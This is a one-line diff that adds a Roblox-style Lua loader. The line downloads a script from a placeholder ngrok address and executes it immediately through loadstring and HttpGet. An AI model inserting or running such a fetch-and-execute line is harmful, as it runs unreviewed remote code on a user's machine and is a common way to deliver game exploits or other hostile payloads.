@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://your-domain.ngrok-free.dev/script.lua"))()
